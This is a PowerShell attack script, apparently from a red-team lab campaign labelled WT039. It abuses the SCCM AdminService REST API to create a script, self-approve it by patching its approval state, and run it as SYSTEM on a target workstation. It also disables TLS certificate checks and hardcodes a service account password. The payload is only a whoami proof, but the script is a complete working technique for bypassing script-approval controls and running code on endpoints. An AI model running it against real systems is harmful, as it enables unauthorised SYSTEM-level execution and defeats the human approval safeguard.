# WT039: Create + approve + run script as SYSTEM on WS01 via AdminService REST — analyst_t1 (ws01 ATTACK)
$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy12 : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint srvPoint, X509Certificate certificate, WebRequest request, int certificateProblem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy12
$mp = 'mbr02.range.local'
$resourceId = 16777220   # WS01
$cred = New-Object System.Management.Automation.PSCredential('range\svc_sccm', (ConvertTo-SecureString 's3rv1c3_SCCM!' -AsPlainText -Force))
$base = "https://$mp/AdminService/v1.0"

# Script payload: whoami + marker file (runs as SYSTEM on client)
$scriptContent = "`$o = whoami`n`$o | Out-File C:\Windows\Temp\wt039-system.txt -Force`n'WT039-PROOF-SYSTEM-EXEC' | Out-File C:\Windows\Temp\wt039-marker.txt -Force`n`$o"

Write-Output "=== WT039: script execution on WS01 (ResourceID=$resourceId) as svc_sccm ==="

# 1. Create script
Write-Output '[1] Create script via POST /Script'
$body = @{
  ScriptName = 'WT039-SYSTEM-Proof'
  ScriptContent = $scriptContent
  ScriptType = 1
  Author = 'RANGE\svc_sccm'
  Comment = 'campaign wt039 system exec proof'
} | ConvertTo-Json
$r = Invoke-RestMethod -Uri "$base/Script" -Method Post -Body $body -ContentType 'application/json' -Credential $cred -TimeoutSec 30
$guid = $r.ScriptGuid
Write-Output ("    ScriptGuid=" + $guid)
Write-Output ("    ApprovalState=" + $r.ApprovalState)

# 2. Ensure approved — set ApprovalState=3 via PATCH (same as working CMPivot script)
Write-Output '[2] Ensure approved (PATCH ApprovalState=3)'
try {
  $patch = @{ ApprovalState = 3 } | ConvertTo-Json
  $r2 = Invoke-RestMethod -Uri "$base/Script('$guid')" -Method Patch -Body $patch -ContentType 'application/json' -Credential $cred -TimeoutSec 30
  Write-Output ("    patched, ApprovalState=" + $r2.ApprovalState)
} catch {
  Write-Output ("    PATCH failed: " + $_.Exception.Message)
}
# verify
try {
  $chk = Invoke-RestMethod -Uri "$base/Script('$guid')" -Credential $cred -TimeoutSec 30
  Write-Output ("    verify ApprovalState=" + $chk.ApprovalState + " Name=" + $chk.ScriptName)
} catch { Write-Output ("    verify GET failed: " + $_.Exception.Message) }

# 3. Run script on device
Write-Output '[3] RunScript on WS01'
$rb = @{ ScriptGuid = $guid } | ConvertTo-Json
$r3 = Invoke-RestMethod -Uri "$base/Device($resourceId)/AdminService.RunScript" -Method Post -Body $rb -ContentType 'application/json' -Credential $cred -TimeoutSec 30
$opId = $r3.OperationId
Write-Output ("    OperationId=" + $opId)

# 4. Poll ScriptResult
Write-Output '[4] Poll ScriptResult'
$done = $false
for ($i = 1; $i -le 20; $i++) {
  Start-Sleep -Seconds 10
  try {
    $pr = Invoke-RestMethod -Uri "$base/Device($resourceId)/AdminService.ScriptResult(OperationId=$opId)" -Credential $cred -TimeoutSec 15
    if ($pr.Status -eq 1 -or $pr.Result) {
      Write-Output ("[+] Result ready (attempt " + $i + ")")
      $pr | ConvertTo-Json -Depth 6
      $done = $true
      break
    }
    Write-Output ("    attempt " + $i + ": status=" + $pr.Status)
  } catch {
    Write-Output ("    attempt " + $i + ": " + $_.Exception.Message)
  }
}
if (-not $done) { Write-Output '[!] Timed out' }
Write-Output ("WT039_DONE guid=" + $guid + " op=" + $opId)
